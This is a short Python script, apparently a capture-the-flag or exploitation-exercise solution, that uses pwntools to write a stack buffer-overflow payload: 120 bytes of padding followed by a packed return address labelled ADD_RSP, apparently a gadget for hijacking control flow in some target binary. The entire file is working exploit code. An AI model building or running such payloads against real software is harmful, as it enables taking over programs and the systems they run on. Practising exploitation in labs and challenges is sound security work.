import sys
from pwn import *

context.log_level = 'error'

OFFSET = b"A" * 120
ADD_RSP = p64(0x43bdfc)

sys.stdout.buffer.write(OFFSET + ADD_RSP)
